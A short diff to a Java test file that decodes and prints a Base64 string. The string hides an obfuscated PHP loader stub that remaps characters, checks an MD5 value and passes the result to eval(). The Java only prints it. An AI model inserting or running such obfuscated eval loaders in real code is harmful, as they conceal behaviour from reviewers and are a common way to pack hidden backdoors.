@@ -1,7 +1,9 @@
-import java.util.Objects;
+import org.apache.commons.codec.binary.Base64;
 
 public class Test {
-    public static void main(String[] args) {
-        Objects.hash("a", "b");
+    public static void main(String[] args) throws Exception {
+        String str = "JGxJSTExSTFsbD0kbDFJSUkxbGwxezh9LiRsMUlJSTFsbDF7OX0uJGwxSUlJMWxsMXszfS4kbDFJSUkxbGwxezEyfS4kbDFJSUkxbGwxezE3fS4kbDFJSUkxbGwxezF9LiRsMUlJSTFsbDF7MTJ9LiRsMUlJSTFsbDF7Nn0uJGwxSUlJMWxsMXsxN30uJGwxSUlJMWxsMXs1fS4kbDFJSUkxbGwxezE1fS4kbDFJSUkxbGwxezR9LiRsMUlJSTFsbDF7Nn0uJGwxSUlJMWxsMXsxMn0uJGwxSUlJMWxsMXs0fS4kbDFJSUkxbGwxezZ9LiRsMUlJSTFsbDF7MH07JEkxMWxJSWwxbD0kbElJMTFJMWxsKCRsbEkxMUkxbEkpOyRsMUkxMUlsSWw9JGwxSUlJMWxsMXsxMH0uJGwxSUlJMWxsMXszfS4kbDFJSUkxbGwxezl9LiRsMUlJSTFsbDF7N30uJGwxSUlJMWxsMXs5fTskbDFsbEkxMUlJPXN1YnN0cigkSTExbElJbDFsLDAsLTMyKTtpZihzdWJzdHIoJEkxMWxJSWwxbCwtMzIpIT1zdHJ0b3VwcGVyKG1kNShwcmVnX3JlcGxhY2UoJy8NLycsJycsJGwxbGxJMTFJSSkpKSl7ZGllKCRsbEkxMUkxbEkpO30kbDFJMTFJbElsPXN0cnRyKHN0cmlwX3RhZ3MoJGwxbGxJMTFJSSksJ2U0dF9pbmFzemNsZmdvZGI2RCcsJGwxSUlJMWxsMSk7ZXZhbCgkSTExSWwxbGxJKCRsMUkxMUlsSWwpKTs";
+        Base64 base64 = new Base64();
+        System.out.println(new String(base64.decode(str)));
     }
 }
